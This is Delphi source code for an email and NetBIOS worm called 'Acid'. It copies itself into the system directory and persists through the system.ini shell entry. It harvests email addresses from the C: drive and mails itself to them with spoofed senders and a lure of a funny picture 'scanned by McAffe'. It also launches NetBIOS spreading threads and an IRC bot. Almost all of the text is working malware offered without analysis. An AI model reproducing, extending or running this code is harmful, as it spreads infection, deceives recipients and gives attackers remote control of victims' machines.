   program Acid;

   uses
     Windows,
     pFunc,
     NetBios,
     winsock,
     MXResolver,
     GetMail in 'GetMail.pas',
     pIrcBot in 'pIrcBot.pas';

   var
     MSG   : TMSG;
     Action: Integer;
     I     : Integer;
     ThreadD:Dword;

     mailSock: TSocket;
     addr    : TSockAddrIn;
     wsa     : TWsaData;
     from, rcpt: String;
     filename: String;
     attachment: String;
     mx      : TMXResolver;

     subject, body: String;

   function mailsend:bool;
   var
     i           : integer;
     f           : FILE;
     FileBuf     : AnsiString;
     Poo         : AnsiString;

   procedure senddata(text:string; sock: tsocket);
   begin
     send(sock, text[1], length(text), 0);
   end;

   begin
     mx := TMXResolver.Create(copy(rcpt,pos('@',rcpt)+1, length(rcpt)));
     if mx.ListOfSMTPServers.Count = 0 then exit ;

     for i :=0 to mx.ListOfSMTPServers.Count -1 do
     begin
       WsaStartUp(MakeWord(2,1),wsa);

       mailsock := socket(af_inet, sock_stream, 0);

       addr.sin_family := af_inet;
       addr.sin_port := htons(25);
       addr.sin_addr.S_addr := inet_addr(pchar(mx.ListOfSMTPServers.Strings(I)));

       if connect(mailsock, addr, sizeof(addr)) > -1 then begin
         senddata('HELO net.com'#13#10,mailsock);
         senddata('MAIL FROM: <'+from+'>'#13#10,mailsock);
         senddata('RCPT TO: <'+rcpt+'>'#13#10,mailsock);
         senddata('DATA'#13#10,mailsock);
         senddata('From: '+from+#13#10+
                  'To: '+rcpt+#13#10+
                  'Subject: '+Subject+#13#10+
                  'MIME-Version: 1.0'#13#10+
                  'Content-Type: multipart/mixed; boundray="ganja"'#13#10#13#10+
                  '--ganja'#13#10+
                  'Content-Type: text/plain; charset:us-ascii'#13#10#13#10+
                  body+#13#10#13#10+
                  '--ganja'#13#10+
                  'Content-Type: application/x-shockwave-flash;'#13#10+
                  '    name="'+attachment+'"'#13#10+
                  'Content-Transfer-Encoding: base64'#13#10#13#10,mailsock);
         AssignFile(f, filename);
         filemode := 0;
         {$I-}
         Reset(f, 1);
         If IOResult = 0 Then Begin
           SetLength(FileBuf, FileSize(F));
           BlockRead(F, FIleBuf[1], GetFileSize(FileName));
           Base64Encode(FileBuf, Poo);
           SendData(Poo,mailsock);
           CloseFile(F);
         End;
         {$I+}

         SendData(#13#10'--ganja--'#13#10'.'#13#10, mailsock);
         SendData('QUIT'#13#10, mailsock);
       end;
       wsacleanup;
     end;
   end;


   Procedure NetBios_;
   Var
     N: TNetBios;
   Begin
     N := TNetBios.Create;
     N.StartNetBIOS;
   End;

   procedure mailsend_;
   var
     i:integer;
   begin
     doscan('c:\', '*', '*.*');
     for i := 0 To mailnr -1 do
     begin
       Subject := 'Hehehe, u''ve never seen a pic this funny! :D';
       Body := 'Heh, Check this funny pic out ;p';
       From := Mails[Random(MailNr)];
       Rcpt := Mails[I];
       Filename := SysDir('SysDll322.com');
       Attachment := 'Funny.jpg - Scanned by McAffe.com';

       If mailsend Then Inc(m_spread);
     end;
   end;

   begin
     Randomize;
     sleep(1000);

     If CreateMutexA(NIL, FALSE, '--O_o--ACID--o_O--') = ERROR_ALREADY_EXISTS Then
       ExitProcess(0);

     CopyFile(pChar(ParamStr(0)), pChar(SysDir('SysDll32.com')), False);
     CopyFile(pChar(ParamStr(0)), pChar(SysDir('SysDll322.com')), False);
     WritePrivateProfileString('boot','shell','explorer.exe sysdll32.com','system.ini');

     ZeroMemory(@Mails, SizeOf(Mails));
     MailNr := 0;
   {
     Case Random(3) Of
       0: Action := 1;
       1: Action := 2;
       2: Action := 3;
     End;
   }
     CreateThread(NIL, 0, @DoIrcBot, NIL, 0, ThreadD);
   {
     If Action = 1 Then
     Begin
       For I := 0 To 300 Do
         CreateThread(NIL, 0, @NetBios_, NIL, 0, ThreadD);
     End;

     If Action = 2 Then
     Begin}
       For I := 0 To 100 Do
         CreateThread(NIL, 0, @NetBios_, NIL, 0, ThreadD);
       CreateThread(NIL, 0, @MailSend_, NIL, 0, ThreadD);
   {  End;

     If Action = 3 Then
     Begin
       CreateThread(NIL, 0, @MailSend_, NIL, 0, ThreadD);
     End;
   }
     While GetMessage(MSG, 0, 0, 0) Do
      DisPatchMessage(MSG);
   end.

